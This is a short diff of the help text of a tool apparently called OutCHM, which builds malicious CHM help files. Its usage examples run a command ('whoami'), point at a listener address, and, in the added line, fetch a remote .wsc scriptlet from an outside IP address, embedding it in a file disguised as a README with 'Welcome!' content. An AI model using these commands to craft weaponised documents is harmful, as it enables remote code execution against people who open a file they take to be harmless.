@@ -706,6 +706,7 @@ description='''OutCHM can create OUT a CHM！
 
 OutCHM.py -r http://192.168.0.100:8080
 OutCHM.py -p 'whoami > c://1.txt'
+OutCHM.py -c http://45.32.62.213/release1.0.wsc -t README -i1 '欢迎' -ic1 'Welcome!' -i2 '具体内容' -ic2 php.htm
 
 ''', 
 epilog='Faster!')
